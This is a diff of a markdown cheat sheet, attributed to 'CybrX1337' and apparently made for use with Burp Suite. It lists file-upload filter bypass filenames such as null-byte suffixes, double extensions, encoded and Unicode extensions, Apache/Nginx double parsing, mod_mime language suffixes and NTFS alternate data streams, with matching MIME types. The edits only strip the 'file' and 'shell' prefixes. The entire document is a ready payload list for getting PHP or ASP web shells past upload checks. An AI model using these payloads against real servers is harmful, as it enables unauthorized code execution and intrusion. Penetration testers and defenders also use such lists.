@@ -61,31 +61,31 @@ _By CybrX1337 – BURPSUITE_
 ---
 
 ## 3️⃣ Null Byte & Control Character Injection (5)
-file.php%00  
-file.php%00.png  
-file.php%0a  
-file.php%09  
-file.php%20  
+.php%00  
+.php%00.png  
+.php%0a  
+.php%09  
+.php%20  
 **MIME-Type Related:** application/x-httpd-php, image/png, image/jpeg, text/plain
 
 ---
 
 ## 4️⃣ Double Extensions (5)
-file.php.jpg  
-file.jpg.php  
-file.png.php  
-file.gif.php  
-file.php.jpg%00.png  
+.php.jpg  
+.jpg.php  
+.png.php  
+.gif.php  
+.php.jpg%00.png  
 **MIME-Type Related:** application/x-httpd-php, image/jpeg, image/png, image/gif
 
 ---
 
 ## 5️⃣ Fragment, Comment & Semicolon Tricks (5)
-file.php#.jpg  
-file.php%23.jpg  
-file.php;jpg  
-file.php;.jpg  
-file.php::$DATA  
+.php#.jpg  
+.php%23.jpg  
+.php;jpg  
+.php;.jpg  
+.php::$DATA  
 **MIME-Type Related:** application/x-httpd-php, image/jpeg, text/plain
 
 ---
@@ -101,21 +101,21 @@ shell.php/..
 ---
 
 ## 7️⃣ Encoded Extensions (5)
-file%2Ephp  
-file%252Ephp  
-file.p%68p  
-file.p\u0068p  
-file.php%2E.jpg  
+%2Ephp  
+%252Ephp  
+.p%68p  
+.p\u0068p  
+.php%2E.jpg  
 **MIME-Type Related:** application/x-httpd-php, image/jpeg
 
 ---
 
 ## 8️⃣ Apache / Nginx Double Parsing (5)
-shell.php/.jpg  
-shell.php%00.jpg  
-shell.php%20.jpg  
-shell.php;jpg  
-shell.php..jpg  
+.php/.jpg  
+.php%00.jpg  
+.php%20.jpg  
+.php;jpg  
+.php..jpg  
 **MIME-Type Related:** application/x-httpd-php, image/jpeg
 
 ---
@@ -161,31 +161,31 @@ Content-Type: application/octet-stream
 ---
 
 ## 1️⃣3️⃣ Archive Tricks (5)
-shell.php.zip  
-shell.php.tar  
-shell.php.tar.gz  
-shell.php.rar  
-shell.php.gz  
+.php.zip  
+.php.tar  
+.php.tar.gz  
+.php.rar  
+.php.gz  
 **MIME-Type Related:** application/zip, application/x-tar, application/gzip, application/x-rar-compressed
 
 ---
 
 ## 1️⃣4️⃣ Legacy Apache mod_mime Confusion (5)
-shell.php.en  
-shell.php.fr  
-shell.php.txt.en  
-shell.php.plain.en  
-shell.php.de  
+.php.en  
+.php.fr  
+.php.txt.en  
+.php.plain.en  
+.php.de  
 **MIME-Type Related:** application/x-httpd-php, text/plain
 
 ---
 
 ## 1️⃣5️⃣ IIS / NTFS Alternate Data Streams (5)
-shell.asp::$DATA  
-shell.php::$DATA  
-shell.php::$INDEX_ALLOCATION  
-shell.aspx::$DATA  
-shell.asp::$INDEX_ALLOCATION  
+.asp::$DATA  
+.php::$DATA  
+.php::$INDEX_ALLOCATION  
+.aspx::$DATA  
+.asp::$INDEX_ALLOCATION  
 **MIME-Type Related:** application/x-httpd-php, application/x-aspx
 
 ---
@@ -231,9 +231,9 @@ Overlapping chunk sizes causing parser confusion
 ---
 
 ## 2️⃣0️⃣ Rare Unicode Dot / Slash Bypasses (5)
-file.php%E2%80%AE.jpg  
-file.php%E2%80%AD.jpg  
-file%u002Ephp  
-file%u2215php  
-file%u2024php  
+.php%E2%80%AE.jpg  
+.php%E2%80%AD.jpg  
+%u002Ephp  
+%u2215php  
+%u2024php  
 **MIME-Type Related:** application/x-httpd-php, image/jpeg
